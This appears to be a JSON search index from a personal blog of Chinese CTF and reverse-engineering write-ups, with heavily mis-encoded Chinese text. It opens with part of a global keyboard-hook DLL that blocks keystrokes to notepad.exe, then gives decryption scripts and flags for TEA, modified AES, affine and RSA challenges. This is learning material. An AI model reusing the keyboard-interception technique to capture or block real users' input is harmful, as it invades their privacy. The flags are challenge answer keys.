DLL_PROCESS_ATTACH: g_hInstance = hinstDLL; break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)&#123; char szPath[MAX_PATH] = &#123;0,&#125;; char *p = NULL; if( nCode &gt;= 0 ) &#123; // bit 31 : 0 =&gt; press, 1 =&gt; release if( !(lParam &amp; 0x80000000) ) &#123; GetModuleFileNameA(NULL, szPath, MAX_PATH); p = strrchr(szPath, &#x27;\\\\&#x27;); // æ³…çŠ æ©‡è‚ºæŠ€èƒ¶ ææŠšé˜‘ åšèƒŒç§¦è¾‘ çˆ¶è· notepad.exe æ‰¼æ 0 é…’å›± è”¼é˜‘ åºœç•”çªƒ // =&gt; 0 é…’å›± è”¼é˜‘ åºœç•”çªæ çš‹çŸ«ç˜¤ç»° ä¿ƒæ¾œæ è‚º å‚ˆå´”ç™»ç˜¤ è‡¼æ¾œ if( !_stricmp(p + 1, DEF_PROCESS_NAME) ) return 1; &#125; &#125; // è€é¦†åˆ©ç‰¢ ç‰ˆå¿«ä¿Šç»° CallNextHookEx() ç”« é¾‹å…çªå’¯ // è§ˆä¾©æ©‡è‚ºå¼Šä¼ (è¶£ç¯® ä¿ƒæ¾œ æ‰°) æ è‚º çš‹çŸ«ç˜¤ç”« å‚ˆå´”çªƒ return CallNextHookEx(g_hHook, nCode, wParam, lParam);&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif __declspec(dllexport) void HookStart() &#123; g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); &#125; __declspec(dllexport) void HookStop() &#123; if( g_hHook ) &#123; UnhookWindowsHookEx(g_hHook); g_hHook = NULL; &#125; &#125;#ifdef __cplusplus&#125;#endif è°ƒè¯•hookç”¨å­—ç¬¦ä¸²æœç´¢ç›´æ¥å®šä½åˆ°mainå‡½æ•° ä¸Šé¢å¾—åˆ°hookStartåœ°å€ï¼Œç„¶åcallï¼ŒF7ç›´æ¥æ­¥å…¥å°±èƒ½è¿›å…¥hookstartå‡½æ•° è¿™é‡Œå°±æ˜¯dllä¸­æ³¨å†Œé”®ç›˜hook ç›´æ¥æ ¹æ®æ³¨å†Œæ—¶å¾—åˆ°çš„åœ°å€è¿›è¡Œè·³è½¬å°±èƒ½å¾—åˆ°hookå‡½æ•° ä¹Ÿå¯ä»¥æ‰“å¼€notepadï¼Œè¿›è¡Œé™„åŠ attachï¼Œå…ˆæ‘F9ï¼Œè®©hookæ³¨å†ŒæˆåŠŸ ç„¶ååœ¨æ–°åŠ ä¸€ä¸ªæ¨¡å—å¤„åœæ­¢ï¼Œoptionè®¾ç½® é™„åŠ ååœ¨é”®ç›˜è¾“å…¥å­—æ¯ï¼Œodä¼šç«‹é©¬æ–­ä½ã€‚","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"syc_level7","slug":"syc-level7","date":"2022-12-20T03:30:36.000Z","updated":"2022-12-20T04:11:42.019Z","comments":true,"path":"2022/12/20/syc-level7/","link":"","permalink":"https://pa1r0t.github.io/2022/12/20/syc-level7/","excerpt":"syc_level7 è¿™ç§å¼‚å¸¸å¤„ç†çš„catchä»£ç ä¸€å¼€å§‹ä¸ä¼šæ‰¾ï¼Œåæ¥çœ‹äº†ä¸‰å¶è‰çš„æˆ˜é˜Ÿçš„è§£ç­”æ‰çŸ¥é“æ€ä¹ˆæ“ä½œ","text":"syc_level7 è¿™ç§å¼‚å¸¸å¤„ç†çš„catchä»£ç ä¸€å¼€å§‹ä¸ä¼šæ‰¾ï¼Œåæ¥çœ‹äº†ä¸‰å¶è‰çš„æˆ˜é˜Ÿçš„è§£ç­”æ‰çŸ¥é“æ€ä¹ˆæ“ä½œ è¿™é‡Œæœ‰å››ä¸ªthrowå—ï¼Œè¦æ‰¾åˆ°å¯¹åº”catchä»£ç ï¼Œç„¶åjmpè¿‡å»å°±èƒ½çœ‹è§æºç ï¼Œä¸‰å¶è‰é‚£è¾¹çš„è§£ç­”æ˜¯æ‰‹æ’¸æ±‡ç¼–ä»£ç ï¼Œè¯´å®è¯è¿™ç§åˆ†æå¤ªæ…¢ï¼Œè€Œä¸”å®¹æ˜“å‡ºé”™ï¼Œè¿˜ä¸å¦‚è®©idaæ¥å¸®æˆ‘ä»¬åˆ†æ è½¬åˆ°å¡ç‰‡å½¢å¼æ±‡ç¼–ä»£ç ï¼Œæœ‰è¿™ç§æ ‡å¿—çš„å°±æ˜¯catchä»£ç  ç„¶åå°†æ‰€æœ‰çš„catchå—æ‰“ä¸Šæ–­ç‚¹ ç„¶ååœ¨throwä»£ç ä¹‹å‰ä¹Ÿéƒ½æ‰“ä¸Šæ–­ç‚¹ ç„¶åï¼Œè¿è¡Œç¨‹åºæ‰¾åˆ°ï¼Œå„ä¸ªthrowå¯¹åº”çš„catchå— ä¿®æ”¹throwä»£ç ä¸ºjmp å¯¹åº”catchåœ°å€ï¼Œç›´æ¥çœ‹åˆ°æºç  è¿™é‡Œéšæœºæ•°ï¼Œå¤§å¾ªç¯32æ¬¡æ¯ä¸€æ¬¡è¦é‡ç½®srandï¼Œå°å¾ªç¯å››æ¬¡ï¼Œæ‰€ä»¥åªéœ€è¦è¾“å‡º4ä¸ªéšæœºæ•°å³å¯ è¿™é‡Œç”¨cè¯­è¨€ä¸­çš„srandä»£ç ç”Ÿæˆéšæœºæ•°ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ&#x3D;&#x3D;æˆ‘åœ¨windowsä¸Šç”¨cè¯­è¨€è·‘ï¼Œè·‘å‡ºæ¥çš„éšæœºæ•°æ ¹æœ¬ä¸å¯¹ã€‚è¦åœ¨linuxä¸Šé¢è·‘æ‰è¡Œ&#x3D;&#x3D; è¿™é‡Œæ ¹æ®éšæœºæ•°ï¼Œæ ‡ä¸Šä»£ç å—çš„æ‰§è¡Œé¡ºåº æœ€åpythonä¼ªä»£ç ï¼š 12345678910111213enc = [0xA3A7C060, 0xEE6E5485, 0x244B2655, 0x318482D9]delta = 0x9E3779B9for i in range(32): v11 += delta v12 += delta v7 += ((v8 &gt;&gt; 5) + 6) ^ (v8 + v11) ^ (16 * v8 + 8) ^ (i + v11) v9 += ((v10 &gt;&gt; 5) + 6) ^ (v10 + v12) ^ (16 * v10 + 8) ^ (i + v12) v8 += ((v7 &gt;&gt; 5) + 7) ^ (v7 + v11) ^ (16 * v7 + 9) ^ (i + v11) v10 += ((v9 &gt;&gt; 5) + 7) ^ (v9 + v12) ^ (16 * v9 + 9) ^ (i + v12)v19 = v7 ^ HIBYTE(delta)v20 = v8 ^ BYTE2(delta)v21 = v9 ^ BYTE1(delta)v22 = v10 ^ (unsigned __int8)delta ç„¶åæ ¹æ®è¿™ä¸ªä»£ç å†™å‡ºè§£å¯†è„šæœ¬ï¼š 1234567891011121314151617181920212223# lesson7from Crypto.Util.number import *enc = [0xA3A7C060, 0xEE6E5485, 0x244B2655, 0x318482D9]delta = 0x9E3779B9s = (delta*32)&amp;0xffffffffv7 = enc[0]^0x9ev8 = enc[1]^0x37v9 = enc[2]^0x79v10 = enc[3]^0xb9for i in range(31,-1,-1): v10 -= ((v9 &gt;&gt; 5) + 7) ^ (v9 + s) ^ (16 * v9 + 9) ^ (i + s) v10 = v10&amp;0xffffffff v8 -= ((v7 &gt;&gt; 5) + 7) ^ (v7 + s) ^ (16 * v7 + 9) ^ (i + s) v8 = v8&amp;0xffffffff v9 -= ((v10 &gt;&gt; 5) + 6) ^ (v10 + s) ^ (16 * v10 + 8) ^ (i + s) v9 = v9&amp;0xffffffff v7 -= ((v8 &gt;&gt; 5) + 6) ^ (v8 + s) ^ (16 * v8 + 8) ^ (i + s) v7 = v7&amp;0xffffffff s = (s-delta)&amp;0xffffffffenc = [v7,v8,v9,v10]flag = int(&#x27;&#x27;.join(map(lambda x: hex(x)[2:],enc)),16)long_to_bytes(flag)#SYC&#123;ediGegTEaEi&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"syc_level5","slug":"syc-level5","date":"2022-12-19T13:02:09.000Z","updated":"2022-12-19T13:11:09.681Z","comments":true,"path":"2022/12/19/syc-level5/","link":"","permalink":"https://pa1r0t.github.io/2022/12/19/syc-level5/","excerpt":"emmmmmmmmmmm,ç¬¬ä¸€æ¬¡åšåˆ°é­”æ”¹aesï¼Œæœ‰ç‚¹æ¿€åŠ¨è®°å½•ä¸€ä¸‹å§","text":"emmmmmmmmmmm,ç¬¬ä¸€æ¬¡åšåˆ°é­”æ”¹aesï¼Œæœ‰ç‚¹æ¿€åŠ¨è®°å½•ä¸€ä¸‹å§ é­”æ”¹AES è¿™é‡Œåš21æ¬¡æ“ä½œã€‚ä½†æ˜¯æ— åˆ—æ··æ·† ç¬¬ä¸€æ¬¡åšè¿™ç§é­”æ”¹aesï¼Œé€†ç€å°±æ˜¯å…ˆè¡Œç§»ä½ï¼ŒåŸå…ˆæ€ä¹ˆç§»åŠ¨ï¼Œå°±é€†å›å» ç„¶åå†å­—èŠ‚æ›¿æ¢ï¼Œä¹Ÿå¯ä»¥é€† ç„¶åå†è½®å¯†é’¥åŠ ï¼Œè¿™ä¸ªè¦ä»åå¾€å‰ï¼Œä¸ç„¶ä¼šå½±å“å­—èŠ‚æ›¿æ¢ï¼Œå­—èŠ‚æ›¿æ¢æ˜¯å¿…é¡»è¦æœ‰é¡ºåºçš„ æœ€åå°±æ˜¯æ¯ä¸€ä¸ªå¯†æ–‡å—çš„åˆå§‹å¼‚æˆ–ï¼Œè¯¥é¢˜é™¤äº†ç¬¬ä¸€å—ï¼Œå…¶ä»–éƒ½æ˜¯æ‹¿å¯†æ–‡å—ä½œä¸ºå¯†åŒ™ ç»“æœï¼š 12345678910111213141516171819202122232425262728293031323334353637# lesson5def row_re(i): # ç¬¬äºŒè¡Œ v1 = a1[13+i*16] a1[13+i*16] = a1[9+i*16] a1[9+i*16] = a1[5+i*16] a1[5+i*16] = a1[1+i*16] a1[1+i*16] = v1 # ç¬¬ä¸‰è¡Œ ä¸å˜ v2 = a1[2+i*16] a1[2+i*16] = a1[10+i*16] a1[10+i*16] = v2 v3 = a1[6+i*16] a1[6+i*16] = a1[14+i*16] a1[14+i*16] = v3 # ç¬¬å››è¡Œ v4 = a1[15+i*16] a1[15+i*16] = a1[3+i*16] a1[3+i*16] = a1[7+i*16] a1[7+i*16] = a1[11+i*16] a1[11+i*16] = v4 a1 = [0xF8, 0x88, 0x9D, 0x31, 0xC7, 0x24, 0xD5, 0xF9, 0x45, 0x28, 0x9B, 0x7D, 0x42, 0x66, 0x65, 0x29, 0x2E, 0xC3, 0xC3, 0x5F, 0x1E, 0x1C, 0x43, 0xE9, 0x1E, 0xE1, 0xB9, 0xBD, 0x85, 0x5B, 0x7A, 0x39, 0xDE, 0xF6, 0xA7, 0xB8, 0xF5, 0xD2, 0xF9, 0xFE, 0xD9, 0xA0, 0x13, 0xF3, 0x43, 0xEF, 0xB2, 0x8A]key_t = [0x58, 0x2F, 0x36, 0xDD, 0x92, 0xF2, 0x79, 0x09, 0xC8, 0x73, 0x6F, 0x0A, 0x36, 0x14, 0x6F, 0x43, 0xB7, 0x1A, 0x21, 0xD0, 0x25, 0xE8, 0x58, 0xD9, 0xED, 0x9B, 0x37, 0xD3, 0xDB, 0x8F, 0x58, 0x90, 0x55, 0x7D, 0x4C, 0x5C, 0x70, 0x95, 0x14, 0x85, 0x9D, 0x0E, 0x23, 0x56, 0x46, 0x81, 0x7B, 0xC6, 0x6C, 0xF6, 0x8D, 0x4F, 0x1C, 0x63, 0x99, 0xCA, 0x81, 0x6D, 0xBA, 0x9C, 0xC7, 0xEC, 0xC1, 0x5A, 0xA5, 0x79, 0x86, 0x50, 0xB9, 0x1A, 0x1F, 0x9A, 0x38, 0x77, 0xA5, 0x06, 0xFF, 0x9B, 0x64, 0x5C, 0x10, 0xBF, 0x28, 0x66, 0xA9, 0xA5, 0x37, 0xFC, 0x91, 0xD2, 0x92, 0xFA, 0x6E, 0x49, 0xF6, 0xA6, 0x42, 0xD6, 0x3C, 0x5E, 0xEB, 0x73, 0x0B, 0xA2, 0x7A, 0xA1, 0x99, 0x58, 0x14, 0xE8, 0x6F, 0xFE, 0x1D, 0xE3, 0x3A, 0xB3, 0xF6, 0x90, 0x31, 0x11, 0x8C, 0x31, 0xA8, 0x49, 0x98, 0xD9, 0xC7, 0xB7, 0x66, 0xFC, 0xE2, 0x77, 0x90, 0x6C, 0xD3, 0x66, 0x1C, 0x5D, 0x7B, 0x2F, 0x84, 0x84, 0xBC, 0x98, 0x70, 0x64, 0x26, 0x57, 0xE0, 0x08, 0xF5, 0x31, 0xFC, 0x55, 0x8E, 0x1E, 0x78, 0xD1, 0x32, 0x86, 0x36, 0xC2, 0x96, 0xDE, 0xD6, 0xCA, 0x63, 0xEF, 0x2A, 0x9F, 0xED, 0xF1, 0x52, 0x4E, 0xDF, 0x77, 0x63, 0xB1, 0xF2, 0x20, 0xB5, 0x7B, 0x91, 0xCF, 0x9F, 0xE4, 0x7C, 0x3E, 0xCD, 0xAA, 0xA3, 0x49, 0xF2, 0xD7, 0xE0, 0x5F, 0x47, 0xAC, 0x71, 0x90, 0xD8, 0x48, 0x0D, 0xAE, 0x15, 0xE2, 0xAE, 0xE7, 0xD5, 0xCC, 0x29, 0x03, 0x92, 0x60, 0x58, 0x93, 0x4A, 0x28, 0x55, 0x3D, 0x5F, 0xCA, 0xFB, 0xDA, 0x79, 0xCF, 0xD9, 0x07, 0xEB, 0xAF, 0x81, 0x94, 0xA1, 0x87, 0xD4, 0xA9, 0xFE, 0x4D, 0x2F, 0x73, 0x56, 0x36, 0xE5, 0x01, 0xBD, 0x99, 0x64, 0x95, 0x1C, 0x1E, 0xB0, 0x3C, 0xE2, 0x53, 0x9F, 0x4F, 0x13, 0x2E, 0x2F, 0x26, 0xAE, 0xB7, 0x4B, 0xB3, 0xB2, 0xA9, 0xFB, 0x8F, 0x50, 0xFA, 0x64, 0xC0, 0x85, 0xE8, 0x33, 0x8D, 0x2B, 0x5F, 0x78, 0x3E, 0x99, 0xF6, 0x83, 0xB1, 0xC9, 0x0C, 0xE7, 0x71, 0x04, 0x21, 0x0D, 0x43, 0x2F, 0x7E, 0x75, 0x7D, 0xB6, 0x88, 0xF6, 0xCC, 0x7F, 0x84, 0x11, 0xBD, 0x24, 0x6F, 0x4F, 0xD7, 0x0B, 0x11, 0x3A, 0xAA, 0xBD, 0x99, 0xCC, 0x66, 0xC2, 0x1D, 0xDD, 0xDB, 0x69, 0xAF, 0xC3, 0x88, 0x62, 0xBE, 0xF9, 0x22, 0xDF, 0x27, 0x35, 0x44, 0x1D, 0x3A, 0xE8, 0x9F, 0x61, 0x70, 0xDB, 0xC5, 0x03, 0xCE, 0x22, 0xE7, 0xDC, 0xE9, 0x17, 0xA3, 0xC1, 0xD3, 0xFF, 0x3C, 0x02]SBOX = [0x28, 0x90, 0xC3, 0x41, 0xC2, 0x75, 0x84, 0xDA, 0x79, 0xE7, 0x21, 0x0C, 0x81, 0xD5, 0xBF, 0x92, 0xB8, 0x4E, 0xB1, 0x2D, 0xED, 0x5C, 0xCB, 0x99, 0x6A, 0x32, 0x6F, 0xF2, 0x52, 0x4D, 0x29, 0x77, 0x49, 0x1D, 0xBB, 0x3A, 0x9F, 0x02, 0x1A, 0x71, 0x58, 0x72, 0xBA, 0xA1, 0x5E, 0xFA, 0x48, 0xF9, 0xFC, 0xF7, 0xA6, 0x97, 0x9D, 0x24, 0x0D, 0xE0, 0xF3, 0x37, 0x08, 0xEA, 0xF5, 0x6B, 0x86, 0xEF, 0x8D, 0x61, 0x65, 0x17, 0xD7, 0x7E, 0x13, 0x9C, 0xCC, 0x12, 0x33, 0x8E, 0x7D, 0x2F, 0x55, 0xCA, 0xAB, 0xE4, 0xFE, 0x45, 0xD6, 0xF6, 0xDE, 0xF1, 0x67, 0xE1, 0x0B, 0xB2, 0xAE, 0xCF, 0x7C, 0x04, 0x0E, 0x16, 0xA2, 0x00, 0xC6, 0xFF, 0x2C, 0x1E, 0x47, 0x30, 0xA4, 0x40, 0x4B, 0x15, 0x38, 0x35, 0xAF, 0x3E, 0x39, 0x3C, 0xD2, 0x85, 0xC7, 0x64, 0x89, 0xFD, 0xE8, 0x8B, 0x43, 0xC8, 0x22, 0x94, 0xA8, 0x31, 0xA3, 0xB9, 0x20, 0xEB, 0xB0, 0x01, 0x3D, 0x68, 0x5A, 0x93, 0x5B, 0x4F, 0x50, 0xE6, 0x6D, 0xF4, 0x44, 0x10, 0x80, 0xA7, 0x51, 0xD3, 0xC4, 0x2B, 0x88, 0x95, 0xA5, 0x70, 0x23, 0x18, 0x09, 0x4A, 0x19, 0x66, 0xDC, 0xEC, 0x14, 0xA9, 0xDB, 0xE2, 0x91, 0x4C, 0x57, 0x82, 0x1B, 0x2A, 0x11, 0x7B, 0x5D, 0x8A, 0xD4, 0xA0, 0x07, 0xD8, 0x53, 0x9B, 0x26, 0xD1, 0x98, 0x42, 0x0A, 0x9A, 0x1C, 0x8F, 0x5F, 0x63, 0xE9, 0xCD, 0xC1, 0x1F, 0x6C, 0xCE, 0xAC, 0xAA, 0xD0, 0x7F, 0x59, 0xBE, 0xB6, 0x46, 0xB7, 0x83, 0xEE, 0x7A, 0x9E, 0xC5, 0x62, 0x60, 0xF0, 0x8C, 0x2E, 0xC0, 0xDD, 0x73, 0x56, 0x76, 0x27, 0xB5, 0x25, 0x74, 0x6E, 0xC9, 0xDF, 0xB4, 0x34, 0x05, 0xD9, 0xB3, 0xBD, 0x3B, 0x54, 0xAD, 0x0F, 0x87, 0x78, 0xFB, 0x69, 0xF8, 0xBC, 0xE3, 0x96, 0x03, 0x3F, 0xE5, 0x06, 0x36]key = [bytearray(b&quot;vMBixpswDVgJhpZd&quot;),[a1[i] for i in range(16)],[a1[i] for i in range(16,32)]]for i in range(3): for p in range(21,-1,-1): row_re(i) for j in range(i*16,(i+1)*16): a1[j] = SBOX.index(a1[j]) for k in range(16): a1[i*16+k] ^= key_t[p*16 + k] for l in range(16): a1[l+16*i] ^= key[i][l]bytearray(a1)# SYC&#123;ZtZJpWvEthTkaDzLQznEYLybEcNOPfmlukmZbzXBhih&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"re_base1","slug":"re-base1","date":"2022-12-17T13:16:25.000Z","updated":"2022-12-17T13:36:34.076Z","comments":true,"path":"2022/12/17/re-base1/","link":"","permalink":"https://pa1r0t.github.io/2022/12/17/re-base1/","excerpt":"re_OD debugger1","text":"re_OD debugger1 æŸ¥æ‰¾mainå‡½æ•°çš„äº”ç§æ–¹æ³•è¿è¡Œç¨‹åºï¼Œçœ‹è§å¼¹çª—ï¼Œç›²çŒœæ˜¯user32.GetmessageW()çš„api æ–¹æ³•ä¸€ï¼š 1.ä¸æ–­åœ°F7æ­¥å…¥å‡½æ•° 2.çœ‹è§ä¸€äº›çº¢è‰²apiï¼Œå³ä¸€äº›åº“å‡½æ•°ï¼Œå°±Ctrl+F9è·³å‡ºæ­¤å‡½æ•° 3.ç›´åˆ°çœ‹è§å¼¹çª—å‡½æ•° æ–¹æ³•äºŒï¼š 1.ä¸æ–­åœ°F8æ­¥è¿‡å‡½æ•° 2.ç›´åˆ°æŸä¸ªå‡½æ•°æ‰§è¡Œäº†å¼¹çª—å‡½æ•°ï¼Œç„¶ååœ¨æ­¤å‡½æ•°ä¹‹ä¸Šä¸‹æ–­ï¼Œç„¶åctrl+F2é‡æ–°å¼€å§‹ 3.ç›´åˆ°æ‰¾åˆ°å¼¹çª—å‡½æ•° æ–¹æ³•ä¸‰ï¼š 1.é€šè¿‡æŸ¥æ‰¾apiçš„æ–¹å¼æŸ¥æ‰¾mainå‡½æ•° 2.å³é”®æŸ¥çœ‹æ¨¡å—é—´çš„è°ƒç”¨å‡½æ•° 3.æ‰¾åˆ°å¼¹çª—å‡½æ•°å³å¯ æ–¹æ³•å››ï¼š 1.Ctrl+næŸ¥æ‰¾æ‰€æœ‰å†…å­˜çš„api æ–¹æ³•äº”ï¼š 1.æŸ¥æ‰¾å­—ç¬¦ä¸²,å³é”®å³å¯ è¿™é‡Œä¿®æ”¹dumpçª—å£çš„æ•°æ®ï¼Œé€‰ä¸­æ•°æ®åæ‘ctrl+E ä¿®æ”¹åå³é”®å¤åˆ¶åˆ°æ–‡ä»¶ åœ¨dumpçª—å£ä¸­ï¼Œå³é”®ä¿å­˜æ–‡ä»¶å³å¯","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"ä¿¡åˆ›ç½‘å®‰wp","slug":"ä¿¡åˆ›ç½‘å®‰wp","date":"2022-12-05T02:42:19.000Z","updated":"2022-12-05T03:12:44.452Z","comments":true,"path":"2022/12/05/ä¿¡åˆ›ç½‘å®‰wp/","link":"","permalink":"https://pa1r0t.github.io/2022/12/05/%E4%BF%A1%E5%88%9B%E7%BD%91%E5%AE%89wp/","excerpt":"çœæ’åï¼š22 webå¸ˆå‚…çº ç»“äºwebæœ€åä¸€é¢˜ï¼Œæ‰€ä»¥æ‚é¡¹ä¸€é“æ²¡åšã€‚ç„¶åæˆ‘æŠŠä»¿å°„å¯†ç çš„åšé¢˜æ€è·¯ç»™å¿˜äº†ï¼Œç„¶åå¯†ç 0è§£ï¼Œè‡³äºpwnâ€¦.","text":"çœæ’åï¼š22 webå¸ˆå‚…çº ç»“äºwebæœ€åä¸€é¢˜ï¼Œæ‰€ä»¥æ‚é¡¹ä¸€é“æ²¡åšã€‚ç„¶åæˆ‘æŠŠä»¿å°„å¯†ç çš„åšé¢˜æ€è·¯ç»™å¿˜äº†ï¼Œç„¶åå¯†ç 0è§£ï¼Œè‡³äºpwnâ€¦. RevShift123456789101112str1=&#x27;â‰â§ƒâ©†ã·•â¿¤á©£á¡¤ã‹Ÿã©¨á£³â¿ƒá£°ã‘¥ã¥Ÿâ«´ã½&#x27;print(str1)for i in str1: t = ord(i)&amp;0xff if t &gt; 128: print(chr(ord(i) &gt;&gt; 7)+chr((ord(i)-128)&amp;0xff),end=&#x27;&#x27;) else: print(chr(ord(i) &gt;&gt; 7)+chr((ord(i))&amp;0xff),end=&#x27;&#x27;)f.close()print(int(&#x27;10000000&#x27;,2))# DASCTF&#123;U_d4c0de_th1s_C1pher_Utf&#125; ReContract1.æ™ºèƒ½åˆçº¦çš„é¢˜ï¼Œæˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡åšï¼Œä½†æç¤ºè¯´æ˜¯ä¸€é“å®¹æ˜“é¢˜ï¼ŒæŸ¥çœ‹æ–‡ä»¶å‘ç°å‰é¢æœ‰å‡ ä¸ªæ•°å­—ç¼ºäº†ï¼Œç›´æ¥ç™¾åº¦æœç€æ‰¾å°±è¡Œ2.ç„¶ååˆæ‰¾åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œä¸Šé¢å†™ç€ä¸€ä¸ªåœ¨çº¿å·¥å…·3.ç›´æ¥å°†å­—èŠ‚ç å¤åˆ¶è¿›å»ç¿»è¯‘å³å¯4.è¿™é‡Œçœ‹è§æœ‰äº”ä¸ªå¯ç–‘æ•°å­—ï¼Œæ‹¿å»è½¬å­—ç¬¦ä¸²çœ‹çœ‹5.å‘ç°é¡ºåºæ˜¯ä¹±çš„ï¼Œä»¥æˆ‘ç¥çº§è‹±è¯­æ°´å¹³ï¼Œå¤§æ¦‚çš„é¡ºåºå°±æ˜¯:â€™åç¼–è¯‘æ™ºèƒ½åˆçº¦å­—èŠ‚ç çœŸçš„ä¸é”™â€™,hhhhhhhhhhhh12345678from Crypto.Util.number import *print(long_to_bytes(0x4279746563306465355f00000000000000000000000000000000000000000000))print(long_to_bytes(0x4441534354467b00000000000000000000000000000000000000000000000000))print(long_to_bytes(0x536d3472745f43306e74724063745f0000000000000000000000000000000000))print(long_to_bytes(0x443363306d70316c655f00000000000000000000000000000000000000000000))print(long_to_bytes(0x31735f46756e4e792e7d00000000000000000000000000000000000000000000))# DASCTF&#123;D3c0mp1le_Sm4rt_C0ntr@ct_Bytec0de5_1s_FunNy.&#125; èµ›åå¤ç°å¯†ç â€”â€“é€†å‘ç¬¬ä¸‰é“æ‡’å¾—å¤ç°ï¼Œè¿˜æœ‰å¯†ç ç¬¬ä¸‰é“ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚&#x3D;&#x3D;çœ‹äº†ä¸€éä»£ç å°±æŠŠæ–‡ä»¶æ‰”åˆ°å›æ”¶ç«™äº†&#x3D;&#x3D; easy_Afflineè¿™é“é¢˜é¢˜ç›®ç»™çš„aï¼Œbæ•°å­—å¤ªå¤§ï¼Œæˆ‘ä»¥ä¸ºè¦çˆ†ç ´å¾ˆé•¿çš„åŒºé—´ï¼Œå…¶å®ä¸ç”¨ï¼Œç»è¿‡æˆ‘è„šæœ¬çš„æµ‹è¯•ï¼Œå‘ç°å¤§æ•°å­—å’Œå°æ•°å­—çš„ç»“æœæ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥åªéœ€éå†0~må³å¯ 1234567891011121314151617181920212223242526272829303132333435from Crypto.Util.number import *import randomtext = &#x27;aCdhpnlmNKuRJbfVIXUvyTrSPqjBMzgwHZkAxWGiYetEsocDLFOQ&#x27;cipher = &#x27;CezmBh&#123;BKDdD_oP_rKD_rdtF_cMHu&#125;&#x27;flag=&#x27;DASCTF&#x27;i = 0def d(): for a in range(2, 52): for b in range(2, 52): if GCD(a,52) == 1: break c = &#x27;&#x27; t = inverse(a,52) for i in cipher: x = text.find(i) c += text[t*(x-b) % len(text)] if c == flag: print(a,b) return d()a = 2b = 6t = inverse(a,52)flag = &#x27;&#x27;for i in cipher: if i not in text: flag += i else: x = text.find(i) flag += text[t*(x-b) % len(text)]print(flag)# DASCTF&#123;TheLe_iU_Ihe_ILxE_Yrjp&#125; gauss_systemsageè§£å³å¯ 12345678910111213k = 1751007263671615053487807501173970925758538c = 463982900309034681135307002234842926080979p, q = var(&quot;p, q&quot;)assume(p, &quot;integer&quot;)assume(q, &quot;integer&quot;)sol = solve((p - 1003) ** 2 + (q - 48) ** 2 == k, p, q)for p, q in sol: if p &gt; 0 and q &gt; 0: p, q = int(p), int(q) if is_prime(p) and is_prime(q): print(p) print(q) 12345678910111213141516import libnumimport gmpy2from Crypto.Util.number import *e = 0x10001s = 1751007263671615053487807501173970925758538c = 463982900309034681135307002234842926080979p = 1087638045546779918273q = 753691412682137267747assert p**2 + q**2 == sphi = (p-1)*(q-1)d = libnum.invmod(e,phi)n = p*qm = pow(c,d,n)long_to_bytes(m)# Z[i]_15_m4g1c","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"NOV Xè”åˆå‡ºé¢˜äºº","slug":"buuctf-nov","date":"2022-11-29T08:52:11.000Z","updated":"2022-11-30T09:27:57.484Z","comments":true,"path":"2022/11/29/buuctf-nov/","link":"","permalink":"https://pa1r0t.github.io/2022/11/29/buuctf-nov/","excerpt":"â€‹ æ¯”èµ›ä¸€ç›´åœ¨æ‰“å®‰æ´µæ¯ï¼Œbuuéƒ½æ²¡å¥½å¥½çœ‹ï¼Œç°åœ¨å®‰æ´µæ¯è¿·å®«é¢˜æ–œç€èµ°è¿˜æ²¡ææ˜ç™½ï¼Œå…ˆæ¥å¤ç°ä¸€æ³¢buuçš„æœˆèµ›","text":"â€‹ æ¯”èµ›ä¸€ç›´åœ¨æ‰“å®‰æ´µæ¯ï¼Œbuuéƒ½æ²¡å¥½å¥½çœ‹ï¼Œç°åœ¨å®‰æ´µæ¯è¿·å®«é¢˜æ–œç€èµ°è¿˜æ²¡ææ˜ç™½ï¼Œå…ˆæ¥å¤ç°ä¸€æ³¢buuçš„æœˆèµ› babytea1. ä¸€ çœ‹æ ¸å¿ƒç®—æ³•ç»å…¸tea2. ç»“æœè„šæœ¬ç®—ä¸å‡ºæ¥&#x3D;&#x3D;ï¼Œæˆ‘è¿˜ä»¥ä¸ºè€å­è„šæœ¬æœ‰é—®é¢˜ï¼ŒåŠ¨è°ƒå‘ç°æœ‰å¼‚å¸¸ï¼Œç›´æ¥å»çœ‹æ±‡ç¼–ï¼Œç»“æœå‘ç°æœç„¶å­˜åœ¨å‡ ä¸ªå¼‚å¸¸ç‚¹a)sum+å¼‚å¸¸b)å¼€å¤´ä¹Ÿæœ‰å¼‚å¸¸ï¼Œè€Œä¸”è¿™ä¸ªæ˜¯é»˜è®¤å¿…é¡»è·³è½¬3.ç›´æ¥ä¿®æ”¹æ±‡ç¼–ï¼Œè®©æŠ¥é”™çš„åœ°æ–¹ç›´æ¥è·³è½¬åˆ°å¼‚å¸¸å¤„ç†ç¨‹åº4.ç„¶åæºç å°±å˜äº†5.ä½†æ˜¯v5åœ°æ–¹ä¸æ˜¯æ¯æ¬¡éƒ½è¦å¼‚æˆ–ï¼Œæ˜¯æœ‰æ¡ä»¶çš„ï¼Œå½“&gt;&gt;0x1f &#x3D;&#x3D; 0æ—¶å¼‚æˆ–6.æ€»ä¹‹è¿™æ˜¯ä¸€é“é­”æ”¹teaç½¢äº†ï¼Œè„šæœ¬å¦‚ä¸‹123456789101112131415161718192021222324252627282930313233343536373839from Crypto.Util.number import *def tea(v,k,d38,d3c): v0 = v[0] v1 = v[1] s = 0 j = [0] # sum for i in range(32): s = (s + dword_41F000)&amp;0xffffffff if (s &gt;&gt; 0x1f) == 0: s ^= 0x1234567 j.append(s) sum = j[32] for i in range(32): v1 -= (k[3] + (v0 &gt;&gt; 5)) ^ (sum + v0) 